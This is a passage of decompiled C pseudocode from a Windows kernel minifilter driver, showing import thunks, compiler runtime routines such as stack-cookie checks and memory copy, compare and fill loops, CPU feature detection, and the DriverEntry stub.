        FLT_FILE_NAME_OPTIONS NameOptions,
        PFLT_FILE_NAME_INFORMATION *FileNameInformation)
{
  return __imp_FltGetFileNameInformation(CallbackData, NameOptions, FileNameInformation);
}


// Function: FltReleaseFileNameInformation at 0x14000774C
// attributes: thunk
void __stdcall FltReleaseFileNameInformation(PFLT_FILE_NAME_INFORMATION FileNameInformation)
{
  __imp_FltReleaseFileNameInformation(FileNameInformation);
}


// Function: GetSecurityUserInfo at 0x140007752
// attributes: thunk
NTSTATUS __stdcall GetSecurityUserInfo(PLUID LogonId, ULONG Flags, PSecurityUserData *UserInformation)
{
  return __imp_GetSecurityUserInfo(LogonId, Flags, UserInformation);
}


// Function: __security_check_cookie at 0x140007770
void __cdecl _security_check_cookie(uintptr_t StackCookie)
{
  __int64 v1; // rcx

  if ( StackCookie != _security_cookie )
ReportFailure:
    sub_140007790(StackCookie);
  v1 = __ROL8__(StackCookie, 16);
  if ( (_WORD)v1 )
  {
    StackCookie = __ROR8__(v1, 16);
    goto ReportFailure;
  }
}


// Function: sub_140007790 at 0x140007790
void __fastcall __noreturn sub_140007790(ULONG_PTR BugCheckParameter1)
{
  KeBugCheckEx(0xF7u, BugCheckParameter1, _security_cookie, BugCheckParameter3, 0LL);
}


// Function: LsaFreeReturnBuffer at 0x1400077BD
// attributes: thunk
NTSTATUS __stdcall LsaFreeReturnBuffer(PVOID Buffer)
{
  return __imp_LsaFreeReturnBuffer(Buffer);
}


// Function: __GSHandlerCheck at 0x1400077C4
__int64 __fastcall _GSHandlerCheck(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  sub_1400077E4(a2, a4, *(_QWORD *)(a4 + 56));
  return 1LL;
}


// Function: sub_1400077E4 at 0x1400077E4
__int64 __fastcall sub_1400077E4(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  int v3; // edx

  result = *(_QWORD *)(a2 + 8);
  v3 = *(unsigned __int8 *)(*(unsigned int *)(*(_QWORD *)(a2 + 16) + 8LL) + result + 3);
  if ( (v3 & 0xF) != 0 )
    return v3 & 0xFFFFFFF0;
  return result;
}


// Function: _vsnwprintf at 0x140007850
// attributes: thunk
int __cdecl vsnwprintf(wchar_t *Dest, size_t Count, const wchar_t *Format, va_list Args)
{
  return _vsnwprintf(Dest, Count, Format, Args);
}


// Function: wcsrchr at 0x140007860
// attributes: thunk
wchar_t *__cdecl wcsrchr(const wchar_t *Str, wchar_t Ch)
{
  return __imp_wcsrchr(Str, Ch);
}


// Function: swscanf_s at 0x140007866
// attributes: thunk
int swscanf_s(const wchar_t *Src, const wchar_t *Format, ...)
{
  return __imp_swscanf_s(Src, Format);
}


// Function: sub_140007880 at 0x140007880
__int64 __fastcall sub_140007880(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rdx
  bool v4; // cf
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // r9

  v3 = a2 - (_QWORD)a1;
  if ( a3 < 8 )
    goto LABEL_6;
  for ( ; ((unsigned __int8)a1 & 7) != 0; --a3 )
  {
    v4 = *(_BYTE *)a1 < *((_BYTE *)a1 + v3);
    if ( *(_BYTE *)a1 != *((_BYTE *)a1 + v3) )
      return -v4 - ((unsigned int)v4 - 1);
    a1 = (unsigned __int64 *)((char *)a1 + 1);
  }
  if ( !(a3 >> 3) )
  {
LABEL_6:
    if ( !a3 )
      return 0LL;
    while ( 1 )
    {
      v4 = *(_BYTE *)a1 < *((_BYTE *)a1 + v3);
      if ( *(_BYTE *)a1 != *((_BYTE *)a1 + v3) )
        break;
      a1 = (unsigned __int64 *)((char *)a1 + 1);
      if ( !--a3 )
        return 0LL;
    }
    return -v4 - ((unsigned int)v4 - 1);
  }
  v6 = a3 >> 5;
  if ( a3 >> 5 )
  {
    while ( 1 )
    {
      v7 = *a1;
      if ( *a1 != *(unsigned __int64 *)((char *)a1 + v3) )
        break;
      v7 = a1[1];
      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 8) )
        goto LABEL_24;
      v7 = a1[2];
      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 16) )
        goto LABEL_23;
      v7 = a1[3];
      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 24) )
      {
        ++a1;
LABEL_23:
        ++a1;
LABEL_24:
        ++a1;
        break;
      }
      a1 += 4;
      if ( !--v6 )
      {
        a3 &= 0x1Fu;
        goto LABEL_18;
      }
    }
  }
  else
  {
LABEL_18:
    v8 = a3 >> 3;
    if ( !(a3 >> 3) )
      goto LABEL_6;
    while ( 1 )
    {
      v7 = *a1;
      if ( *a1 != *(unsigned __int64 *)((char *)a1 + v3) )
        break;
      ++a1;
      if ( !--v8 )
      {
        a3 &= 7u;
        goto LABEL_6;
      }
    }
  }
  v4 = _byteswap_uint64(v7) < _byteswap_uint64(*(unsigned __int64 *)((char *)a1 + v3));
  return -v4 - ((unsigned int)v4 - 1);
}


// Function: strcpy_s at 0x140007947
// attributes: thunk
errno_t __cdecl strcpy_s(char *a1, rsize_t SizeInBytes, const char *Src)
{
  return __imp_strcpy_s(a1, SizeInBytes, Src);
}


// Function: _strlwr at 0x14000794D
// attributes: thunk
char *__cdecl strlwr(char *String)
{
  return _strlwr(String);
}


// Function: strstr at 0x140007953
// attributes: thunk
char *__cdecl strstr(const char *Str, const char *SubStr)
{
  return __imp_strstr(Str, SubStr);
}


// Function: sub_14000795C at 0x14000795C
__int64 sub_14000795C()
{
  int v5; // r8d
  char v7; // r9
  int v12; // r10d

  _RAX = 0LL;
  __asm { cpuid }
  v5 = _RAX;
  _RAX = 1LL;
  v7 = 0;
  __asm { cpuid }
  v12 = _RCX;
  _RAX = 7LL;
  if ( v5 >= 7 )
  {
    v7 = 0;
    __asm { cpuid }
    LOBYTE(_RAX) = 2;
    if ( (_RBX & 0x200) != 0 )
      v7 = 2;
  }
  if ( (v12 & 0x100000) != 0 && (v12 & 0x8000000) != 0 && (v12 & 0x10000000) != 0 )
  {
    __asm { xgetbv }
    if ( (_RAX & 6) == 6 )
      v7 |= 4u;
  }
  byte_14000A240 = v7 | 1;
  return 0LL;
}


// Function: _guard_check_icall_nop at 0x140007A00
void guard_check_icall_nop()
{
  ;
}


// Function: _guard_dispatch_icall_nop at 0x140007A20
__int64 __fastcall guard_dispatch_icall_nop()
{
  __int64 (*v0)(void); // rax

  return v0();
}


// Function: _guard_xfg_dispatch_icall_nop at 0x140007A40
// attributes: thunk
__int64 __fastcall guard_xfg_dispatch_icall_nop()
{
  __int64 (*v0)(void); // rax

  return v0();
}


// Function: sub_140007A80 at 0x140007A80
__m128 *__fastcall sub_140007A80(char *a1, char *a2, unsigned __int64 a3)
{
  __m128 *result; // rax
  __int64 v4; // r11
  __int64 v5; // rdx
  __int128 v6; // xmm1
  bool v7; // cf
  signed __int64 v8; // rdx
  char v9; // r11
  char *v10; // rcx
  char v11; // r11
  char *v12; // r11
  signed __int64 v13; // rdx
  __m128 v14; // xmm0
  unsigned __int64 v15; // rcx
  unsigned __int64 v16; // rcx
  __m128 v17; // xmm1
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // r9
  __int128 v20; // xmm1
  __int128 v21; // xmm2
  __int128 v22; // xmm3
  __m128 v23; // xmm4
  unsigned __int64 j; // r9
  unsigned __int64 v25; // r8
  unsigned __int64 v26; // r9
  __m128 v27; // xmm1
  __m128 v28; // xmm2
  __m128 v29; // xmm3
  __m128 v30; // xmm4
  char *v31; // rcx
  __int128 v32; // xmm0
  unsigned __int64 v33; // rcx
  unsigned __int64 v34; // r8
  _OWORD *v35; // r11
  __int128 v36; // xmm1
  unsigned __int64 v37; // r9
  __int128 v38; // xmm1
  __int128 v39; // xmm2
  __int128 v40; // xmm3
  __int128 v41; // xmm4
  unsigned __int64 i; // r9
  unsigned __int64 v43; // r8

  result = (__m128 *)a1;
  if ( a3 < 8 )
  {
    if ( a3 )
    {
      v7 = a2 < a1;
      v8 = a2 - a1;
      if ( v7 )
      {
        v10 = &a1[a3];
        do
        {
          v11 = v10[v8 - 1];
          --v10;
          --a3;
          *v10 = v11;
        }
        while ( a3 );
      }
      else
      {
        do
        {
          v9 = a1[v8];
          ++a1;
          --a3;
          *(a1 - 1) = v9;
        }
        while ( a3 );
      }
    }
  }
  else if ( a3 > 0x10 )
  {
    if ( a3 > 0x20 )
    {
      v12 = &a2[a3];
      v7 = a2 < a1;
      v13 = a2 - a1;
      if ( v7 && v12 > a1 )
      {
        v31 = &a1[a3];
        v32 = *(_OWORD *)&v31[v13 - 16];
        v33 = (unsigned __int64)(v31 - 16);
        v34 = a3 - 16;
        if ( (v33 & 0xF) != 0 )
        {
          v35 = (_OWORD *)v33;
          v33 &= 0xFFFFFFFFFFFFFFF0uLL;
          v36 = *(_OWORD *)(v33 + v13);
          *v35 = v32;
          v32 = v36;
          v34 = v33 - (_QWORD)result;
        }
        v37 = v34 >> 6;
        if ( v34 >> 6 )
        {
          v34 &= 0x3Fu;
          do
          {
            v38 = *(_OWORD *)(v33 + v13 - 16);
            v39 = *(_OWORD *)(v33 + v13 - 32);
            v40 = *(_OWORD *)(v33 + v13 - 48);
            v41 = *(_OWORD *)(v33 + v13 - 64);
            *(_OWORD *)v33 = v32;
            v33 -= 64LL;
            --v37;
            *(_OWORD *)(v33 + 48) = v38;
            *(_OWORD *)(v33 + 32) = v39;
            *(_OWORD *)(v33 + 16) = v40;
            v32 = v41;
          }
          while ( v37 );
        }
        for ( i = v34 >> 4; i; --i )
        {
          *(_OWORD *)v33 = v32;
          v32 = *(_OWORD *)(v33 + v13 - 16);
          v33 -= 16LL;
        }
        v43 = v34 & 0xF;
        if ( v43 )
          *(_OWORD *)(v33 - v43) = *(_OWORD *)(v33 - v43 + v13);
        *(_OWORD *)v33 = v32;
      }
      else
      {
        v14 = *(__m128 *)&a1[v13];
        v15 = (unsigned __int64)(a1 + 16);
        if ( (v15 & 0xF) != 0 )
        {
          v16 = v15 & 0xFFFFFFFFFFFFFFF0uLL;
          v17 = *(__m128 *)(v16 + v13);
          *result = v14;
          v14 = v17;
          v15 = v16 + 16;
        }
        v18 = (unsigned __int64)result + a3 - v15;
        v19 = v18 >> 6;
        if ( v18 >> 6 )
        {
          if ( v19 > 0x1000 )
          {
            v26 = v18 >> 6;
            v18 &= 0x3Fu;
            _mm_prefetch((const char *)(v15 + v13 + 64), 0);
            do
            {
              v27 = *(__m128 *)(v15 + v13);
              v28 = *(__m128 *)(v15 + v13 + 16);
              v29 = *(__m128 *)(v15 + v13 + 32);
              v30 = *(__m128 *)(v15 + v13 + 48);
              _mm_stream_ps((float *)(v15 - 16), v14);
              v15 += 64LL;
              _mm_prefetch((const char *)(v15 + v13 + 64), 0);
              --v26;
              _mm_stream_ps((float *)(v15 - 64), v27);
              _mm_stream_ps((float *)(v15 - 48), v28);
              _mm_stream_ps((float *)(v15 - 32), v29);
              v14 = v30;
            }
            while ( v26 );
            _mm_sfence();
          }
          else
          {
            v18 &= 0x3Fu;
            do
            {
              v20 = *(_OWORD *)(v15 + v13);
              v21 = *(_OWORD *)(v15 + v13 + 16);
              v22 = *(_OWORD *)(v15 + v13 + 32);
              v23 = *(__m128 *)(v15 + v13 + 48);
              *(__m128 *)(v15 - 16) = v14;
              v15 += 64LL;
              --v19;
              *(_OWORD *)(v15 - 64) = v20;
              *(_OWORD *)(v15 - 48) = v21;
              *(_OWORD *)(v15 - 32) = v22;
              v14 = v23;
            }
            while ( v19 );
          }
        }
        for ( j = v18 >> 4; j; --j )
        {
          *(__m128 *)(v15 - 16) = v14;
          v14 = *(__m128 *)(v15 + v13);
          v15 += 16LL;
        }
        v25 = v18 & 0xF;
        if ( v25 )
          *(_OWORD *)(v15 + v25 - 16) = *(_OWORD *)(v15 + v25 - 16 + v13);
        *(__m128 *)(v15 - 16) = v14;
      }
    }
    else
    {
      v6 = *(_OWORD *)&a2[a3 - 16];
      *(_OWORD *)a1 = *(_OWORD *)a2;
      *(_OWORD *)&a1[a3 - 16] = v6;
    }
  }
  else
  {
    v4 = *(_QWORD *)a2;
    v5 = *(_QWORD *)&a2[a3 - 8];
    *(_QWORD *)a1 = v4;
    *(_QWORD *)&a1[a3 - 8] = v5;
  }
  return result;
}


// Function: sub_140007D40 at 0x140007D40
__int64 __fastcall sub_140007D40(char *a1, unsigned __int8 a2, unsigned __int64 a3)
{
  __int64 result; // rax
  __int64 v4; // rdx
  __m128 v5; // xmm0
  char *v6; // r8
  __m128 *v7; // rdx
  _OWORD *v8; // r9
  unsigned __int64 v9; // r8
  __m128 *v10; // r9
  unsigned __int64 v11; // r8
  char *v12; // r9
  unsigned __int64 v13; // r8

  result = (__int64)a1;
  v4 = 0x101010101010101LL * a2;
  v5 = _mm_movelh_ps((__m128)(unsigned __int64)v4, (__m128)(unsigned __int64)v4);
  if ( a3 >= 0x40 )
  {
    if ( (byte_14000A240 & 2) != 0 && a3 >= 0x320 )
      return sub_140007E80();
    *(__m128 *)a1 = v5;
    v6 = &a1[a3];
    a1 = (char *)((unsigned __int64)(a1 + 16) & 0xFFFFFFFFFFFFFFF0uLL);
    a3 = v6 - a1;
    if ( a3 >= 0x40 )
    {
      v7 = (__m128 *)&a1[a3 - 16];
      v8 = (_OWORD *)((unsigned __int64)&a1[a3 - 48] & 0xFFFFFFFFFFFFFFF0uLL);
      v9 = a3 >> 6;
      do
      {
        *(__m128 *)a1 = v5;
        *((__m128 *)a1 + 1) = v5;
        a1 += 64;
        --v9;
        *((__m128 *)a1 - 2) = v5;
        *((__m128 *)a1 - 1) = v5;
      }
      while ( v9 );
      *v8 = v5;
      v8[1] = v5;
      v8[2] = v5;
      *v7 = v5;
      return result;
    }
LABEL_9:
    v10 = (__m128 *)&a1[a3 - 16];
    *(__m128 *)a1 = v5;
    v11 = (a3 & 0x20) >> 1;
    *v10 = v5;
    *(__m128 *)&a1[v11] = v5;
    *(__m128 *)((char *)v10 - v11) = v5;
    return result;
  }
  if ( a3 >= 0x10 )
    goto LABEL_9;
  if ( a3 < 4 )
  {
    if ( a3 )
    {
      *a1 = v4;
      if ( a3 != 1 )
        *(_WORD *)&a1[a3 - 2] = v4;
    }
  }
  else
  {
    v12 = &a1[a3 - 4];
    *(_DWORD *)a1 = v4;
    v13 = (a3 & 8) >> 1;
    *(_DWORD *)v12 = v4;
    *(_DWORD *)&a1[v13] = v4;
    *(_DWORD *)&v12[-v13] = v4;
  }
  return result;
}


// Function: sub_140007E80 at 0x140007E80
__int64 __fastcall sub_140007E80(_OWORD *a1, __int64 a2, __int64 a3)
{
  __int128 v3; // xmm0
  __int64 result; // rax

  if ( (byte_14000A240 & 1) == 0 )
    result = sub_140007F00();
  *a1 = v3;
  a1[1] = v3;
  a1[2] = v3;
  a1[3] = v3;
  memset(
    (void *)((unsigned __int64)(a1 + 4) & 0xFFFFFFFFFFFFFFC0uLL),
    v3,
    (unsigned __int64)a1 + a3 - ((unsigned __int64)(a1 + 4) & 0xFFFFFFFFFFFFFFC0uLL));
  return result;
}


// Function: sub_140007F00 at 0x140007F00
void sub_140007F00()
{
  sub_14000795C();
}


// Function: DriverEntry at 0x14000C000
NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
  _security_init_cookie();
  return sub_1400025B8(DriverObject, RegistryPath);
}


// Function: __security_init_cookie at 0x14000C02C
void __cdecl _security_init_cookie()
{
  uintptr_t v0; // rax
  unsigned __int64 v1; // rax

  v0 = _security_cookie;
  if ( !_security_cookie || _security_cookie == 0x2B992DDFA232LL )
  {
    v1 = __rdtsc();
    _security_cookie = (unsigned __int64)&_security_cookie ^ (((unsigned __int64)HIDWORD(v1) << 32) | (unsigned int)v1);
    HIWORD(_security_cookie) = 0;
    v0 = _security_cookie;
    if ( !_security_cookie )
    {
      v0 = 0x2B992DDFA232LL;
      _security_cookie = 0x2B992DDFA232LL;
    }
  }
  BugCheckParameter3 = ~v0;
}


